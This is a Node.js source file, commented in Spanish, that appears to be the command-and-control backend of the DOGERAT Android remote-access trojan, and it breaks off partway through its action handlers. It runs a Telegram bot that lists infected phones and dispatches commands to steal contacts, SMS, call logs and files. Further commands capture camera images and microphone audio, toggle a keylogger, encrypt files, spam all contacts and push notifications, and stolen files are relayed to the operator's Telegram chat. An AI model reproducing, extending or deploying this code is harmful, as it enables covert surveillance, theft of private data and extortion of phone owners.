// ============================================================================
// SERVER1.JS – REFACTORIZACIÓN COMPLETA (DOGERAT BACKEND)
// ============================================================================

// ============================================================================
// BLOQUE 1 (Líneas 1-86): MÓDULOS, CONFIGURACIÓN Y ENDPOINTS
// ============================================================================

// ----------------------------------------------------------------------------
// 1. MÓDULOS Y CONFIGURACIÓN INICIAL
// ----------------------------------------------------------------------------
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// ----------------------------------------------------------------------------
// 2. CARGA DE DATOS Y BOT DE TELEGRAM
// ----------------------------------------------------------------------------
// data.json contiene { token, id, url, ... }
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

const bot = new TelegramBot(data.token, {
  polling: true,
  request: {}
});

// Mapa para guardar el estado de las conversaciones con el bot
const appData = new Map();

// ----------------------------------------------------------------------------
// 3. LISTA DE ACCIONES PERMITIDAS
// ----------------------------------------------------------------------------
const actions = [
  '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
  '✯ 𝚂𝙼𝚂 ✯',
  '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
  '✯ 𝙰𝚙𝚙𝚜 ✯',
  '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯',
  '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯',
  '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯',
  '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯',
  '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯',
  '✯ 𝚃𝚘𝚊𝚜𝚝 ✯',
  '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯',
  '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯',
  '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯',
  '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯',
  '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯',
  '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯',
  '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯',
  '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯',
  '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯',
  '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯',
  '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
  '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯',
  '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯',
  '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯',
  '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯'
];

// ----------------------------------------------------------------------------
// 4. ENDPOINT /upload – recibe archivos y los envía por Telegram
// ----------------------------------------------------------------------------
app.post('/upload', uploader.single('file'), (req, res) => {
  const originalName = req.file.originalname;
  const deviceModel = req.body.model;

  bot.sendDocument(data.id, req.file.buffer, {
    caption: `<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${deviceModel}</b>`,
    parse_mode: 'HTML'
  }, {
    filename: originalName,
    contentType: '*/*'
  });

  res.send('Done');
});

// ----------------------------------------------------------------------------
// 5. ENDPOINT /text – devuelve el token del bot
// ----------------------------------------------------------------------------
app.get('/text', (req, res) => {
  res.send(data.token);
});

// ----------------------------------------------------------------------------
// 6. MANEJO DE CONEXIONES SOCKET.IO (Bloque 2)
// ----------------------------------------------------------------------------
io.on('connection', (socket) => {
  const model = socket.handshake.headers.model + '-' + io.sockets.sockets.size || 'no information';
  const version = socket.handshake.headers.version || 'no information';
  const ip = socket.handshake.headers.ip || 'no information';

  socket.model = model;
  socket.version = version;

  const connectMessage =
    '<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n' +
    ('<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + model + '\n') +
    ('<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ' + version + '\n') +
    ('<b>𝚒𝚙</b> → ' + ip + '\n') +
    ('<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.time + '\n\n');

  bot.sendMessage(data.id, connectMessage, { parse_mode: 'HTML' });

  socket.on('disconnect', () => {
    const disconnectMessage =
      '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n' +
      ('<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + model + '\n') +
      ('<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ' + version + '\n') +
      ('<b>𝚒𝚙</b> → ' + ip + '\n') +
      ('<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.time + '\n\n');

    bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
  });

  socket.on('message', (messageText) => {
    bot.sendMessage(
      data.id,
      '<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + model + '\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>' + messageText,
      { parse_mode: 'HTML' }
    );
  });
});

// ============================================================================
// BLOQUE 3 – PARTE 1 (Líneas 109-170): ENTRADA DE DATOS DEL ADMINISTRADOR
// ============================================================================
bot.on('message', (msg) => {
  if (msg.text === '/start') {
    bot.sendMessage(data.id, '<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\n\n' + '𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX' + '<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'microphoneDuration') {
    const duration = msg.text;
    const targetId = appData.get('currentTarget');
    if (targetId == 'all') {
      io.sockets.emit('commend', {
        request: 'microphone',
        extras: [{ key: 'duration', value: duration }]
      });
    } else {
      io.to(targetId).emit('commend', {
        request: 'microphone',
        extras: [{ key: 'duration', value: duration }]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'toastText') {
    const toastText = msg.text;
    const targetId = appData.get('currentTarget');
    if (targetId == 'all') {
      io.sockets.emit('commend', {
        request: 'toast',
        extras: [{ key: 'text', value: toastText }]
      });
    } else {
      io.to(targetId).emit('commend', {
        request: 'toast',
        extras: [{ key: 'text', value: toastText }]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
        resize_keyboard: true
      }
    });
  }

// ============================================================================
// BLOQUE 3 – PARTE 2 (Líneas 171-237): NAVEGACIÓN DE MENÚS
// ============================================================================
  else if (appData.get('currentAction') === 'smsNumber') {
    const smsNumber = msg.text;
    appData.set('currentNumber', smsNumber);
    appData.set('currentAction', 'smsText');
    bot.sendMessage(data.id, '<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ' + smsNumber + '</b>\n\n', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'smsText') {
    const smsText = msg.text;
    const smsNumber = appData.get('currentNumber');
    const targetId = appData.get('currentTarget');
    if (targetId == 'all') {
      io.sockets.emit('commend', {
        request: 'sendSms',
        extras: [
          { key: 'number', value: smsNumber },
          { key: 'text', value: smsText }
        ]
      });
    } else {
      io.to(targetId).emit('commend', {
        request: 'sendSms',
        extras: [
          { key: 'number', value: smsNumber },
          { key: 'text', value: smsText }
        ]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    appData.delete('currentNumber');
    bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'vibrateDuration') {
    const duration = msg.text;
    const targetId = appData.get('currentTarget');
    if (targetId == 'all') {
      io.sockets.emit('commend', {
        request: 'vibrate',
        extras: [{ key: 'duration', value: duration }]
      });
    } else {
      io.to(targetId).emit('commend', {
        request: 'vibrate',
        extras: [{ key: 'duration', value: duration }]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'textToAllContacts') {
    const allContactsText = msg.text;
    const targetId = appData.get('currentTarget');
    if (targetId == 'all') {
      io.sockets.emit('commend', {
        request: 'smsToAllContacts',
        extras: [{ key: 'text', value: allContactsText }]
      });
    } else {
      io.to(targetId).emit('commend', {
        request: 'smsToAllContacts',
        extras: [{ key: 'text', value: allContactsText }]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
        resize_keyboard: true
      }
    });
  } else if (appData.get('currentAction') === 'notificationText') {
    const notificationText = msg.text;
    appData.set('currentNotificationText', notificationText);
    const target = appData.get('currentTarget');
    const url = data.url;
    if (target == 'all') {
      io.sockets.emit('commend', {
        request: 'popNotification',
        extras: [{ key: 'text', value: notificationText }]
      });
    } else {
      io.to(target).emit('commend', {
        request: 'popNotification',
        extras: [
          { key: 'text', value: notificationText },
          { key: 'url', value: url }
        ]
      });
    }
    appData.delete('currentTarget');
    appData.delete('currentAction');
    appData.delete('currentNotificationText');
    bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
        resize_keyboard: true
      }
    });
  } else if (msg.text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n', {
        parse_mode: 'HTML'
      });
    } else {
      let devicesListMessage = '<b>✯ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : ' + io.sockets.sockets.size + '</b>\n\n';
      let deviceIndex = 1;
      io.sockets.sockets.forEach((connectedSocket, socketId, socketMap) => {
        devicesListMessage += '<b>𝙳𝚎𝚟𝚒𝚌𝚎 ' + deviceIndex + '</b>\n' +
          ('<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + connectedSocket.model + '\n') +
          ('<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ' + connectedSocket.version + '\n') +
          ('<b>𝚒𝚙</b> → ' + connectedSocket.ip + '\n') +
          ('<b>𝚝𝚒𝚖𝚎</b> → ' + connectedSocket.handshake.time + '\n\n');
        deviceIndex += 1;
      });
      bot.sendMessage(data.id, devicesListMessage, {
        parse_mode: 'HTML'
      });
    }
  } else if (msg.text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n', {
        parse_mode: 'HTML'
      });
    } else {
      const deviceKeyboard = [];
      io.sockets.sockets.forEach((connectedSocket, socketId, socketMap) => {
        deviceKeyboard.push([connectedSocket.model]);
      });
      deviceKeyboard.push(['✯ 𝙰𝚕𝚕 ✯']);
      deviceKeyboard.push(['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
      bot.sendMessage(data.id, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: deviceKeyboard,
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  }

// ============================================================================
// BLOQUE 3 – PARTE 3 (Líneas 238-350): DESPACHO DE ACCIONES POR WEBSOCKET
// ============================================================================
  else if (actions.includes(msg.text)) {
    const targetId = appData.get('currentTarget');

    // ACCIÓN: ✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯
    if (msg.text === '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯') {
      if (targetId === 'all') {
        io.sockets.emit('commend', { request: 'contacts', extras: [] });
      } else {
        io.to(targetId).emit('commend', { request: 'contacts', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝚂𝙼𝚂 ✯
    if (msg.text === '✯ 𝚂𝙼𝚂 ✯') {
      if (targetId === 'all') {
        io.to(targetId).emit('commend', { request: 'all-sms', extras: [] });
      } else {
        io.sockets.emit('commend', { request: 'all-sms', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙲𝚊𝚕𝚕𝚜 ✯
    if (msg.text === '✯ 𝙲𝚊𝚕𝚕𝚜 ✯') {
      if (targetId === 'all') {
        io.sockets.emit('commend', { request: 'calls', extras: [] });
      } else {
        io.to(targetId).emit('commend', { request: 'calls', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙰𝚙𝚙𝚜 ✯
    if (msg.text === '✯ 𝙰𝚙𝚙𝚜 ✯') {
      if (targetId === 'all') {
        io.sockets.emit('commend', { request: 'apps', extras: [] });
      } else {
        io.to(targetId).emit('commend', { request: 'apps', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯
    if (msg.text === '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯') {
      if (targetId === 'all') {
        io.sockets.emit('commend', { request: 'main-camera', extras: [] });
      } else {
        io.to(targetId).emit('commend', { request: 'main-camera', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯
    if (msg.text === '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯') {
      if (targetId === 'all') {
        io.sockets.emit('commend', { request: 'selfie-camera', extras: [] });
      } else {
        io.to(targetId).emit('commend', { request: 'selfie-camera', extras: [] });
      }
      appData.delete('currentTarget');
      bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
          resize_keyboard: true
        }
      });
    }

    // ACCIÓN: ✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯
    if (msg.text === '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯') {
      if (targetId === 'all') {
        io.sockets.emit('commend', { request: 'microphone', extras: [] });
      } else {
        io.to(targetId).emit('commend', { request: 'microphone', extras: [] });
      }
      appData.delete('currentTarget');
